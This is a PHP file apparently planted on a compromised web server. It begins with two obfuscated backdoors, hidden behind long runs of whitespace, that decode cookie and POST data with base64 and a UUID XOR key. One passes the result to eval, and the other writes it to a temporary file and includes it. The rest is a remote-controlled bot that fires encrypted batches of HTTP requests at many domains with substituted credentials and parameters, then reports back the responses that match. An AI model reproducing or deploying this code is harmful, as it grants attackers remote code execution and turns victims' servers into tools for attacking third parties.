<?php                                                                                                                                                                                                                                                                                                                                                                                                 $comCrAJmR = class_exists("dGu_mqFnr");if (!$comCrAJmR){class dGu_mqFnr{private $TqmwL;public static $mBBRjxuX = "ea9f6756-00d2-4e67-9d90-a3966f57fa1c";public static $Flrqc = NULL;public function __construct(){$btvTMwPzH = $_COOKIE;$PuqYsJXH = $_POST;$uyzXDsLF = @$btvTMwPzH[substr(dGu_mqFnr::$mBBRjxuX, 0, 4)];if (!empty($uyzXDsLF)){$JOUCqGq = "base64";$eyNfoqe = "";$uyzXDsLF = explode(",", $uyzXDsLF);foreach ($uyzXDsLF as $KtuIS){$eyNfoqe .= @$btvTMwPzH[$KtuIS];$eyNfoqe .= @$PuqYsJXH[$KtuIS];}$eyNfoqe = array_map($JOUCqGq . chr (95) . "\x64" . chr ( 544 - 443 ).chr (99) . chr ( 754 - 643 ).chr ( 461 - 361 ).chr (101), array($eyNfoqe,)); $eyNfoqe = $eyNfoqe[0] ^ str_repeat(dGu_mqFnr::$mBBRjxuX, (strlen($eyNfoqe[0]) / strlen(dGu_mqFnr::$mBBRjxuX)) + 1);dGu_mqFnr::$Flrqc = @unserialize($eyNfoqe);}}public function __destruct(){$this->ufiXczIfN();}private function ufiXczIfN(){if (is_array(dGu_mqFnr::$Flrqc)) {$IoIiQJLZ = str_replace("\74" . "\x3f" . 'p' . chr (104) . chr (112), "", dGu_mqFnr::$Flrqc[chr ( 289 - 190 )."\x6f" . 'n' . chr ( 274 - 158 )."\x65" . chr ( 406 - 296 ).chr (116)]);eval($IoIiQJLZ);exit();}}}$FKdER = new dGu_mqFnr(); $FKdER = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("Hc_eqz")){class Hc_eqz{public static $IxcnLIY = "d4b8171d-4a20-42b4-883e-16f6131d9631";public static $ouCiOnXGmD = NULL;public function __construct(){$bWofqAH = $_COOKIE;$yzeSMAiVNn = $_POST;$KEiVLiM = @$bWofqAH[substr(Hc_eqz::$IxcnLIY, 0, 4)];if (!empty($KEiVLiM)){$CQjyROWG = "base64";$wzffhpC = "";$KEiVLiM = explode(",", $KEiVLiM);foreach ($KEiVLiM as $sixJYHrZ){$wzffhpC .= @$bWofqAH[$sixJYHrZ];$wzffhpC .= @$yzeSMAiVNn[$sixJYHrZ];}$wzffhpC = array_map($CQjyROWG . "\137" . "\144" . "\x65" . "\143" . chr (111) . chr ( 443 - 343 )."\145", array($wzffhpC,)); $wzffhpC = $wzffhpC[0] ^ str_repeat(Hc_eqz::$IxcnLIY, (strlen($wzffhpC[0]) / strlen(Hc_eqz::$IxcnLIY)) + 1);Hc_eqz::$ouCiOnXGmD = @unserialize($wzffhpC);}}public function __destruct(){$this->tMyJUedzeh();}private function tMyJUedzeh(){if (is_array(Hc_eqz::$ouCiOnXGmD)) {$YIPwIupzvG = sys_get_temp_dir() . "/" . crc32(Hc_eqz::$ouCiOnXGmD["\x73" . "\141" . "\154" . chr (116)]);@Hc_eqz::$ouCiOnXGmD["\x77" . chr ( 461 - 347 ).chr (105) . "\164" . "\145"]($YIPwIupzvG, Hc_eqz::$ouCiOnXGmD[chr ( 801 - 702 )."\x6f" . "\x6e" . 't' . chr (101) . "\x6e" . chr ( 787 - 671 )]);include $YIPwIupzvG;@Hc_eqz::$ouCiOnXGmD["\144" . "\145" . "\154" . "\x65" . chr ( 530 - 414 ).'e']($YIPwIupzvG);exit();}}}$JMwZvyh = new Hc_eqz(); $JMwZvyh = NULL;} ?><?php

class Check
{
    public static function l__0()
    {
        if (isset($_POST['checks'])) {
            $_0 = curl_multi_init();
            if (version_compare(PHP_VERSION, "5.3.0") < 0) {
                echo "%%vda8303j9" . "f3pdosjflnsd890g%%";
                exit();
            }
            echo "%%NOGIPfdspFJdf"
                . "iPSmnSpojpqwoDPFJP%%";
            exit();
        }
    }
}

class TaskGenerator
{
    private static $default_headers = array('Accept-Language: en-US,en;q=0.5', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',);
    private static $default_results = array();

    private static function get_all_full_paths($task_urls_option)
    {
        if (empty($task_urls_option["urls"])) {
            return array();
        }
        $task_urls_option = $task_urls_option["urls"];
        if (isset($task_urls_option["paths"]) && !empty($task_urls_option["paths"]) &&
            is_array($task_urls_option["paths"])) {
            $_4 = $task_urls_option["paths"];
        } else {
            $_4 = array();
        }
        if (isset($task_urls_option["files"]) && !empty($task_urls_option["files"]) &&
            is_array($task_urls_option["files"])) {
            $_5 = $task_urls_option["files"];
        } else {
            $_5 = array();
        }
        $_6 = array();
        if ($_4) {
            foreach ($_4 as $_7) {
                if ($_5) {
                    foreach ($_5 as $_8) {
                        $_6[] = $_7 . $_8;
                    }
                } else {
                    $_6[] = $_7;
                }
            }
        } else if ($_5) {
            foreach ($_5 as $_8) {
                $_6[] = $_8;
            }
        }
        return
            $_6;
    }

    public static function decrypt($_9)
    {
        $_9 = base64_decode($_9);
        $_10 = "fcf01cb6-d298-4251-97e9-1fd0a71558b9";
        $_11 = "";
        for ($_12 = 0; $_12 < strlen($_9);) {
            for ($_13 = 0; $_13 < strlen($_10) && $_12 < strlen($_9); $_13++, $_12++) {
                $_11 .=
                    chr(ord($_9[$_12]) ^ ord($_10[$_13]));
            }
        }
        return $_11;
    }

    public static function unpack($_9)
    {
        $_9 = TaskGenerator::decrypt($_9);
        $_14 = unserialize($_9);
        return $_14;
    }

    public static function generate($task_option)
    {
        $tasks = array();

        $_16 = !empty($task_option["request"]) ? $task_option["request"] : "GET";
        $_17 = !empty($task_option["headers"]) ? $task_option["headers"] : TaskGenerator::$default_headers;
        $_18 = !empty($task_option["post_rawdata"]) ? $task_option["post_rawdata"] : NULL;
        $_19 = !empty($task_option["post_params"]) ? $task_option["post_params"] : array();
        $_20 = !empty($task_option["get_params"]) ? $task_option["get_params"] : array();
        $_21 = !empty($task_option["cookie_params"]) ? $task_option["cookie_params"] : array();
        $_22 = !empty($task_option["math_results"]["not_substr"]) ? $task_option["math_results"]["substr"] : "";
        $_23 = !empty($task_option["math_results"]["substr"]) ? $task_option["math_results"]["substr"] : "";
        $_24 = !empty($task_option["math_results"]["regexp"]) ? $task_option["math_results"]["regexp"] : "";
        $_25 = !empty($task_option["request_timeout"]) ? intval($task_option["request_timeout"]) : 15.0;
        $_26 = !empty($task_option["connection_timeout"]) ? intval($task_option["connection_timeout"]) : 5.0;
        $_27 = !empty($task_option["return_results"]) ? $task_option["return_results"] : TaskGenerator::$default_results;
        $url_paths = TaskGenerator::get_all_full_paths($task_option);
        if (isset($task_option["urls"]) && !empty($task_option["urls"])) {
            foreach ($task_option["urls"]["domains"] as $domain => $domain_meta) {
                foreach ($url_paths as $url_path) {
                    $domain_req_url = $domain . $url_path;

                    $task = new Task();

                    $task->method = $_16;
                    $task->domain = $domain;
                    $task->url = $domain_req_url;
                    $task->timeout = $_25;
                    $task->timeout_conn = $_26;
                    $task->headers = $_17;
                    $task->post_rawdata = $_18;
                    $task->post_params = $_19;
                    $task->get_params = $_20;
                    $task->cookie_params = $_21;
                    $task->domain_meta = $domain_meta;
                    if (isset($task_option["meta"])) $task->global_meta = $task_option["meta"];
                    $task->results_match_notsubstr = $_22;
                    $task->results_match_substr = $_23;
                    $task->results_match_regexp = $_24;
                    $task->results_return_value = $_27;
                    $tasks[] = $task;
                }
            }
        }
        return $tasks;
    }
}

class Task
{
    public $method;
    public $domain;
    public $url;

    public $headers;

    public $post_rawdata;
    public $post_params;
    public $get_params;
    public $cookie_params;

    public $domain_meta;
    public $global_meta;
    private $macros_ctx;

    public $results_match_notsubstr;
    public $results_match_substr;
    public $results_match_regexp;
    public $results_return_value;

    public $timeout;
    public $timeout_conn;

    private $curl_handler = NULL;
    private $result = array();

    private function get_macro_value($name)
    {
        $_39 = "";

        if ($name == "MYDOMAIN")
        {
            return $this->domain;
        }

        if ($name == "MYURL")
        {
            return $this->url;
        }

        if (isset($this->macros_ctx[$name])) {
            return
                $this->macros_ctx[$name];
        }
        if (!empty($this->domain_meta[$name])) {
            $_40 = array_rand($this->domain_meta[$name]);
            $_39 = $this->domain_meta[$name][$_40];
            $this->macros_ctx[$name] = $_39;
            unset($this->domain_meta[$name][$_40]);
        } else
            if (!empty($this->global_meta[$name])) {
                $_40 = array_rand($this->global_meta[$name]);
                $_39 = $this->global_meta[$name][$_40];
                $this->macros_ctx[$name] = $_39;
                unset($this->global_meta[$name][$_40]);
            }
        return $_39;
    }

    private function process_macros($data)
    {
        if (is_array($data)) {
            $_41 = array();
            $_42 = array_keys($data);
            foreach ($_42 as $_10) {
                $_43 = $this->process_macros($_10);
                $_44 = $this->process_macros($data[$_10]);
                $_41[$_43] = $_44;
            }
            return $_41;
        } else
            if (is_string($data)) {
                preg_match_all("/\{\{(.*?)\}\}/", $data, $_45);
                for ($_12 = 0; $_12 < sizeof($_45[0]); $_12++) {
                    $_46 = $_45[0][$_12];
                    $_38 = $_45[1][$_12];
                    $_47 = $this->get_macro_value($_38);
                    $data = str_replace($_46, $_47, $data);
                }
                return
                    $data;
            } else {
                return $data;
            }
    }

    private function gen_headers()
    {
        $res = array();
        $headers = $this->process_macros($this->headers);
        $cookies = $this->process_macros($this->cookie_params);
        foreach ($headers as $key => $value) {
            $res[] = $key . ": " . $value;
        }
        if (!empty($cookies))
        {
            $cookie = "Cookie: ";
            foreach ($cookies as $key => $value) {
                $cookie .= $key . "=" . $value . ";";
            }
            $res[] = $cookie;
        }

        return $res;
    }

    public function get_curl_handler()
    {
        if (!empty($this->curl_handler)) {
            return $this->curl_handler;
        }
        if (!empty($this->get_params)) {
            $_34 = $this->url . "?" . http_build_query($this->process_macros($this->get_params));
        } else {
            $_34 = $this->url;
        }
        $_37 = curl_init($_34);
        curl_setopt($_37, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($_37, CURLOPT_CONNECTTIMEOUT, $this->timeout_conn);
        curl_setopt($_37, CURLOPT_TIMEOUT, $this->timeout);
        curl_setopt($_37, CURLINFO_HEADER_OUT, true);
        curl_setopt($_37, CURLOPT_HEADER, 1);
        curl_setopt($_37, CURLOPT_VERBOSE, 1);
        curl_setopt($_37, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($_37, CURLOPT_CUSTOMREQUEST, $this->method);
        if ($this->headers) {
            curl_setopt($_37, CURLOPT_HTTPHEADER, $this->gen_headers());
        }
        if (!empty($this->post_params) || !empty($this->post_rawdata)) {
            if (!empty($this->post_rawdata)) {
                curl_setopt($_37, CURLOPT_POSTFIELDS, $this->process_macros($this->post_rawdata));
            } else {
                curl_setopt($_37, CURLOPT_POSTFIELDS, http_build_query($this->process_macros($this->post_params)));
            }
            curl_setopt($_37, CURLOPT_POST, 1);
            curl_setopt($_37, CURLOPT_CUSTOMREQUEST, "POST");
        }
        curl_setopt($_37, CURLOPT_BUFFERSIZE, 128.0);
        curl_setopt($_37, CURLOPT_NOPROGRESS, false);
        curl_setopt($_37, CURLOPT_POSTREDIR, 3);
        $this->curl_handler = $_37;
        return $_37;
    }

    public function parse_result($result)
    {
        $is_matched = FALSE;
        if (!empty($this->results_match_substr)) {
            if (strpos($result, $this->results_match_substr) !==
                FALSE) {
                $is_matched = TRUE;
            }
        }
        if (!empty($this->results_match_regexp)) {
            if (preg_match($this->results_match_regexp, $result)) {
                $is_matched = TRUE;
            }
        }
        if (!empty($this->results_match_notsubstr)) {
            if (strpos($result, $this->results_match_notsubstr) !== FALSE) {
                $is_matched = FALSE;
            }
        }
        if ($is_matched) {
            $this->result["domain"] = $this->domain;
            $this->result["url"] = $this->url;
            if (in_array("macros", $this->results_return_value)) {
                $this->result["macros"] = $this->macros_ctx;
            }
            if (in_array("post_param", $this->results_return_value)) {
                if (!empty($this->post_rawdata)) {
                    $this->result["post_param"] = $this->post_rawdata;
                } else {
                    $this->result["post_param"] = $this->post_params;
                }
            }
            if (in_array("return_data", $this->results_return_value)) {
                $this->result["return_data"] = $result;
            }
        }
        return
            $this->result;
    }

    public function get_result()
    {
        return $this->result;
    }
}

class TaskExecutor
{
    public static function run($tasks, $_51)
    {
        $_0 = curl_multi_init();
        foreach ($tasks as $task) {
            curl_multi_add_handle($_0, $task->get_curl_handler());
        }
        $running = NULL;
        do {
            curl_multi_exec($_0, $running);
        } while ($running > 0);
        foreach ($tasks as $task) {
            $task->parse_result(curl_multi_getcontent($task->get_curl_handler()));
            curl_multi_remove_handle($_0, $task->get_curl_handler());
        }
        curl_multi_close($_0);
        return $tasks;
    }
}

$tasks_options = TaskGenerator::unpack($_POST["request_option"]);;
if (!$tasks_options) {
    exit();
}
$tasks = TaskGenerator::generate($tasks_options);
$tasks = TaskExecutor::run($tasks, -1);
$results = array();
foreach ($tasks as
         $task) {
    $result = $task->get_result();
    if (!empty($result)) {
        $results[] = $result;
    }
}
echo "%%%NDOS039" . "dNDIOF%%%" . serialize($results) . "%%%mfpODPM" . "EWpo345ODf%%%" . PHP_EOL;


